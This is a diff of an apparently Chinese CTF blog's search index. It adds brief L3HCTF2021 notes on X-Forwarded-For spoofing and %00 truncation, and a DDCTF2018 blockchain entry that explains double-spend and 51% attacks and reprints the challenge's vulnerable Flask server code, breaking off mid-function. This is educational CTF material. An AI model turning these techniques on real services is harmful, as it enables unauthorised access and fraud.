-        transferred <span class="token operator">=</span> transfer<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> shop_address<span class="token punctuation">,</span> shop_wallet_address<span class="token punctuation">,</span> balance<span class="token punctuation">[</span>shop_address<span class="token punctuation">]</span><span class="token punctuation">,</span> shop_privkey<span class="token punctuation">)</span>
-        new_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>tail<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'save the DDCoins in a cold wallet'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>
-        append_block<span class="token punctuation">(</span>new_block<span class="token punctuation">)</span>
-        msg <span class="token operator">+=</span> <span class="token string">' You receive a diamond.'</span>
-    <span class="token keyword">return</span> msg
-
-
-<span class="token comment" spellcheck="true"># if you mess up the blockchain, use this to reset the blockchain.</span>
-@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/reset'</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">reset_blockchain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">if</span> <span class="token string">'blocks'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span> <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span>
-    <span class="token keyword">if</span> <span class="token string">'genesis_block_hash'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span> <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span>
-    <span class="token keyword">return</span> <span class="token string">'reset.'</span>
-
-@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/source_code'</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">show_source_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    source <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'serve.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
-    html <span class="token operator">=</span> <span class="token string">''</span>
-    <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>
-        html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>
-    source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> html
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span></code></pre>
-]]></content>
-      <tags>
-        <tag>区块链</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Flask debug PIN命令执行漏洞/CISCN2018：final-TimeKeeper/GYCTF2020：FlaskApp</title>
     <url>/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/</url>
     <content><![CDATA[<h1 id="Flask-debug-PIN命令执行漏洞"><a href="#Flask-debug-PIN命令执行漏洞" class="headerlink" title="Flask debug PIN命令执行漏洞"></a>Flask debug PIN命令执行漏洞</h1><p>在同一台机器上，多次重启Flask服务，PIN码值不改变，即PIN值固定。</p>
@@ -21029,6 +20646,635 @@ print(rv)
 ]]></content>
       <tags>
         <tag>Flask debug PIN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>L3HCTF2021</title>
+    <url>/2021/11/14/l3hctf2021/</url>
+    <content><![CDATA[<h1 id="Image-Service-1"><a href="#Image-Service-1" class="headerlink" title="Image Service 1"></a>Image Service 1</h1><p>注册登录</p>
+<p>发现可以上传图片并share</p>
+<p>且存在admin账号需要localhost才能登陆</p>
+<p>尝试xff 127.0.0.1和localhost失败</p>
+<p>发现sharelist可以采用%00截断</p>
+<p>burp中URL解码</p>
+<p><img src="/2021/11/14/l3hctf2021/image-20211114151427550.png" alt="image-20211114151427550"></p>
+<h1 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h1><p><img src="/2021/11/14/l3hctf2021/image-20211114150641142.png" alt="image-20211114150641142"></p>
+<p>在复制的时候发现框选l3hctf会一起框选ctf</p>
+<p>复制源码到vscode中：</p>
+<p><img src="/2021/11/14/l3hctf2021/image-20211114150814776.png" alt="image-20211114150814776"></p>
+<p><strong>payload：</strong></p>
+<p><img src="/2021/11/14/l3hctf2021/image-20211114150851368.png" alt="image-20211114150851368"></p>
+<p><img src="/2021/11/14/l3hctf2021/image-20211114150924773.png" alt="image-20211114150924773"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>区块链及双花攻击原理/UTXO/DDCTF2018：mini blockchain</title>
+    <url>/2021/11/15/qu-kuai-lian-ji-shuang-hua-gong-ji-yuan-li-utxo-ddctf2018-mini-blockchain/</url>
+    <content><![CDATA[<h1 id="UTXO"><a href="#UTXO" class="headerlink" title="UTXO"></a>UTXO</h1><p>其实并没有什么比特币，只有 UTXO：</p>
+<p><a href="https://www.chainnode.com/tutorial/4381">https://www.chainnode.com/tutorial/4381</a></p>
+<p>UTXO原理：</p>
+<p><a href="https://www.zhihu.com/question/59913301">https://www.zhihu.com/question/59913301</a></p>
+<h1 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h1><p>看一张交易模型：</p>
+<p>![image-20211115170900135](区块链及双花攻击原理-UTXO-DDCTF2018：mini blockchain.assets/image-20211115170900135.png)</p>
+<p>区块链由区块和链构成，每次交易输出输入必须相同</p>
+<h2 id="双花攻击"><a href="#双花攻击" class="headerlink" title="双花攻击"></a>双花攻击</h2><p>双花攻击是同一笔UTXO在不同交易中的花费，双花不会产生新的货币，只能把自己花出去的钱重新拿回来。</p>
+<p>如何进行51% attack攻击？</p>
+<p><strong>创造一条超过原始链的长度</strong></p>
+<h1 id="Python2-安装-RSA"><a href="#Python2-安装-RSA" class="headerlink" title="Python2 安装 RSA"></a>Python2 安装 RSA</h1><h2 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h2><p>下载<code>ez_setup.py</code></p>
+<p><a href="http://peak.telecommunity.com/dist/ez_setup.py">http://peak.telecommunity.com/dist/ez_setup.py</a></p>
+<p>python2执行</p>
+<p>下载<code>rsa-3.1.1-py2.7.egg</code>并复制到D:\Python27\Scripts目录下，该目录下执行</p>
+<p><a href="https://pypi.org/project/rsa/3.1.1/#files">https://pypi.org/project/rsa/3.1.1/#files</a></p>
+<pre><code>easy_install.exe rsa-3.1.1-py2.7.egg</code></pre>
+<h2 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h2><p>1.</p>
+<pre><code>sudo python ez_setup.py</code></pre>
+<p>2.</p>
+<pre><code>sudo easy_install rsa-3.1.1-py2.7.egg</code></pre>
+<h1 id="DDCTF2018：mini-blockchain"><a href="#DDCTF2018：mini-blockchain" class="headerlink" title="DDCTF2018：mini blockchain"></a>DDCTF2018：mini blockchain</h1><p>![image-20211101145544001](区块链及双花攻击原理-UTXO-DDCTF2018：mini blockchain.assets/image-20211101145544001.png)</p>
+<pre class=" language-json"><code class="language-json">Announcement<span class="token operator">:</span> The server has been restarted at <span class="token number">21</span><span class="token operator">:</span><span class="token number">45</span> <span class="token number">04</span>/<span class="token number">17</span>. All blockchain have been reset. View source code
+
+hash of genesis block<span class="token operator">:</span> 3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962
+
+the bank's addr<span class="token operator">:</span> b780aa1fba896158371edc45168f681608ae1315f9a2de3e3c9d85489c36bb22dbd8efcd9473e8fa5c4250d3df4f125b<span class="token punctuation">,</span> 
+the hacker's addr<span class="token operator">:</span> a7b568edbcc8a9c395555642bdff0fcaf3772e50f6565264ab661f2e23b5bcb361501713fc9ab1d81197893502055a4b<span class="token punctuation">,</span> 
+the shop's addr<span class="token operator">:</span> d2510c299359754f6a2c86069a674538f265c1c3c6808c8da0b751f427ffe6291073ddf0a220f4954b358bd9c52a0071
+
+Balance of all addresses<span class="token operator">:</span><span class="token punctuation">{</span>
+    <span class="token property">"d2510c299359754f6a2c86069a674538f265c1c3c6808c8da0b751f427ffe6291073ddf0a220f4954b358bd9c52a0071"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>     
+    <span class="token property">"b780aa1fba896158371edc45168f681608ae1315f9a2de3e3c9d85489c36bb22dbd8efcd9473e8fa5c4250d3df4f125b"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>     
+    <span class="token property">"a7b568edbcc8a9c395555642bdff0fcaf3772e50f6565264ab661f2e23b5bcb361501713fc9ab1d81197893502055a4b"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>     
+    <span class="token property">"8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7"</span><span class="token operator">:</span> <span class="token number">999999</span><span class="token punctuation">,</span> 
+    <span class="token property">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token punctuation">}</span>
+
+All utxos<span class="token operator">:</span> <span class="token punctuation">{</span>
+    <span class="token property">"621d14eb-8be4-4a1a-aeba-3abc077b9892"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+        <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> 
+        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"8aca42fcc869e9bc9910cf1c762c533ff7ef688cce362eb0e0abcad5ac686bc5"</span><span class="token punctuation">,</span> 
+        <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token punctuation">,</span> 
+        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"621d14eb-8be4-4a1a-aeba-3abc077b9892"</span>
+        <span class="token punctuation">}</span><span class="token punctuation">,</span> 
+    <span class="token property">"375c1f2b-58b9-4282-a3bd-8e9b7591b236"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+        <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">999999</span><span class="token punctuation">,</span> 
+        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"0ede005c512d4d8cca71ed0bc32733472b5bf4128ce4812e5f4b31be1f345a64"</span><span class="token punctuation">,</span> 
+        <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7"</span><span class="token punctuation">,</span> 
+        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"375c1f2b-58b9-4282-a3bd-8e9b7591b236"</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+Blockchain Explorer<span class="token operator">:</span> <span class="token punctuation">{</span>
+    <span class="token property">"108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+        <span class="token property">"nonce"</span><span class="token operator">:</span> <span class="token string">"HAHA, I AM THE BANK NOW!"</span><span class="token punctuation">,</span> 
+        <span class="token property">"prev"</span><span class="token operator">:</span> <span class="token string">"3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962"</span><span class="token punctuation">,</span>
+        <span class="token property">"hash"</span><span class="token operator">:</span><span class="token string">"108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369"</span><span class="token punctuation">,</span> 
+        <span class="token property">"transactions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
+            <span class="token property">"input"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"845e6673-ad33-4645-97f6-ef4f8895e82c"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
+            <span class="token property">"signature"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"0f808f1d3b6016c2f5a06e00602c3d4ffaac76efb04eb97f8ff9f76ed745b58f357ad7dab38d33bc7229f7b1df158034"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
+            <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"7ce1d7a76757c181593b3e02433b24d05d86133ca0c9c5bcb46371e3846f0fbe"</span><span class="token punctuation">,</span> 
+            <span class="token property">"output"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
+                <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">999999</span><span class="token punctuation">,</span> 
+                <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"0ede005c512d4d8cca71ed0bc32733472b5bf4128ce4812e5f4b31be1f345a64"</span><span class="token punctuation">,</span> 
+                <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7"</span><span class="token punctuation">,</span> 
+                <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"375c1f2b-58b9-4282-a3bd-8e9b7591b236"</span>
+            <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+                <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> 
+                <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"8aca42fcc869e9bc9910cf1c762c533ff7ef688cce362eb0e0abcad5ac686bc5"</span><span class="token punctuation">,</span> 
+                <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token punctuation">,</span> 
+                <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"621d14eb-8be4-4a1a-aeba-3abc077b9892"</span>
+            <span class="token punctuation">}</span><span class="token punctuation">]</span>
+        <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
+        <span class="token property">"height"</span><span class="token operator">:</span> <span class="token number">1</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
+    <span class="token property">"e92b1df81deac2217847b89de1d38e4b06c19d58aa95a5fed6413c629c2eb616"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+        <span class="token property">"nonce"</span><span class="token operator">:</span> <span class="token string">"a empty block"</span><span class="token punctuation">,</span> 
+        <span class="token property">"prev"</span><span class="token operator">:</span> <span class="token string">"108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369"</span><span class="token punctuation">,</span> 
+        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"e92b1df81deac2217847b89de1d38e4b06c19d58aa95a5fed6413c629c2eb616"</span><span class="token punctuation">,</span> 
+        <span class="token property">"transactions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
+        <span class="token property">"height"</span><span class="token operator">:</span> <span class="token number">2</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
+    <span class="token property">"3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+        <span class="token property">"nonce"</span><span class="token operator">:</span> <span class="token string">"The Times 03/Jan/2009 Chancellor on brink of second bailout for bank"</span><span class="token punctuation">,</span> 
+        <span class="token property">"prev"</span><span class="token operator">:</span> <span class="token string">"0000000000000000000000000000000000000000000000000000000000000000"</span><span class="token punctuation">,</span> 
+        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962"</span><span class="token punctuation">,</span> 
+        <span class="token property">"transactions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
+            <span class="token property">"input"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
+            <span class="token property">"signature"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
+            <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"c3a654c05dc934708f962d78dd795768132256a7d64c866439975a43024e15ec"</span><span class="token punctuation">,</span> 
+            <span class="token property">"output"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
+                <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">1000000</span><span class="token punctuation">,</span> 
+                <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"8cb6994bbb901d94bda4388669f42c65a08685526e977d2a09ae69568d590aca"</span><span class="token punctuation">,</span> 
+                <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token punctuation">,</span> 
+                <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"845e6673-ad33-4645-97f6-ef4f8895e82c"</span>
+            <span class="token punctuation">}</span><span class="token punctuation">]</span>
+        <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
+        <span class="token property">"height"</span><span class="token operator">:</span> <span class="token number">0</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>参数解释，括号内为生成函数</p>
+<ul>
+<li><p>nonce：自定义字符串</p>
+</li>
+<li><p>prev：上一个块的hash</p>
+</li>
+<li><p>hash：本个块的hash（hashhash，hash_reducer，hash_block）</p>
+</li>
+<li><p>transactions：交易（tx）</p>
+</li>
+<li><p>input：之前utxo的id</p>
+</li>
+<li><p>output：UTXO</p>
+</li>
+<li><p>amount：数量</p>
+</li>
+<li><p>hash：UTXO的hash（hash，hash_reducer，hash_utxo）</p>
+</li>
+<li><p>id：这个UTXO的id</p>
+</li>
+<li><p>addr：目标地址</p>
+</li>
+<li><p>hash：交易的hash（hash，hash_reducer，hash_tx）</p>
+</li>
+<li><p>signature：交易签名（sign_input_utxo）</p>
+<h2 id="utxos"><a href="#utxos" class="headerlink" title="utxos"></a>utxos</h2><ul>
+<li>其实就是地址余额，利用这个独立于区块链的数据结构来存储交易最终各个地址的余额</li>
+<li>使得区块链系统中的新交易并不需要追溯整个交易历史，就可以确认当前交易是否合法</li>
+</ul>
+<pre><code>  {
+    "amount":余额,
+    "addr":钱包地址,
+    "id":标识每一个utxo的id,
+    "hash":根据以上三个数据生成的hash
+  }</code></pre>
+<h2 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h2><p>区块block</p>
+<pre><code>  {
+    "nonce":调和参数,
+    "prev":前块hash,
+    "hash":本块hash,
+    "transactions":交易记录
+  }</code></pre>
+<p>交易记录transactions</p>
+<pre><code>  {
+    "input":付款钱包utxos的id,
+    "output":收款钱包地址的utxos,
+    "signature":付款地址的签名，由付款钱包的utxos中id和私钥计算生成,
+    "hash":由input和付款钱包的utxos中id计算出的交易hash
+  }</code></pre>
+</li>
+</ul>
+<h2 id="View-source-code"><a href="#View-source-code" class="headerlink" title="View source_code:"></a>View source_code:</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- encoding: utf-8 -*-</span>
+<span class="token comment" spellcheck="true"># written in python 2.7</span>
+__author__ <span class="token operator">=</span> <span class="token string">'garzon'</span>
+
+<span class="token keyword">import</span> hashlib<span class="token punctuation">,</span> json<span class="token punctuation">,</span> rsa<span class="token punctuation">,</span> uuid<span class="token punctuation">,</span> os
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> escape<span class="token punctuation">,</span> request
+<span class="token keyword">from</span> pycallgraph <span class="token keyword">import</span> PyCallGraph  
+<span class="token keyword">from</span> pycallgraph <span class="token keyword">import</span> Config  
+<span class="token keyword">from</span> pycallgraph<span class="token punctuation">.</span>output <span class="token keyword">import</span> GraphvizOutput 
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>
+url_prefix <span class="token operator">=</span> <span class="token string">''</span>
+
+<span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">'Here is your flag: DDCTF{******************}'</span>
+
+<span class="token keyword">def</span> <span class="token function">hash</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">hash_reducer</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> hash<span class="token punctuation">(</span>hash<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span>hash<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">has_attrs</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> attrs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> type<span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Input should be a dict/JSON"</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> attr <span class="token keyword">in</span> attrs<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> attr <span class="token operator">not</span> <span class="token keyword">in</span> d<span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"{} should be presented in the input"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+EMPTY_HASH <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">*</span><span class="token number">64</span>
+
+<span class="token keyword">def</span> <span class="token function">addr_to_pubkey</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>PublicKey<span class="token punctuation">(</span>int<span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">65537</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">pubkey_to_address</span><span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">assert</span> pubkey<span class="token punctuation">.</span>e <span class="token operator">==</span> <span class="token number">65537</span>
+    hexed <span class="token operator">=</span> hex<span class="token punctuation">(</span>pubkey<span class="token punctuation">.</span>n<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> hexed<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> hexed <span class="token operator">=</span> hexed<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> hexed<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> hexed <span class="token operator">=</span> hexed<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+    <span class="token keyword">return</span> hexed
+
+<span class="token keyword">def</span> <span class="token function">gen_addr_key_pair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    pubkey<span class="token punctuation">,</span> privkey <span class="token operator">=</span> rsa<span class="token punctuation">.</span>newkeys<span class="token punctuation">(</span><span class="token number">384</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> pubkey_to_address<span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span><span class="token punctuation">,</span> privkey
+
+bank_address<span class="token punctuation">,</span> bank_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
+hacker_address<span class="token punctuation">,</span> hacker_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
+shop_address<span class="token punctuation">,</span> shop_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
+shop_wallet_address<span class="token punctuation">,</span> shop_wallet_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">sign_input_utxo</span><span class="token punctuation">(</span>input_utxo_id<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>input_utxo_id<span class="token punctuation">,</span> privkey<span class="token punctuation">,</span> <span class="token string">'SHA-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">hash_utxo</span><span class="token punctuation">(</span>utxo<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">create_output_utxo</span><span class="token punctuation">(</span>addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    utxo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'addr'</span><span class="token punctuation">:</span> addr_to<span class="token punctuation">,</span> <span class="token string">'amount'</span><span class="token punctuation">:</span> amount<span class="token punctuation">}</span>
+    utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_utxo<span class="token punctuation">(</span>utxo<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> utxo
+
+<span class="token keyword">def</span> <span class="token function">hash_tx</span><span class="token punctuation">(</span>tx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>
+        reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span><span class="token punctuation">,</span>
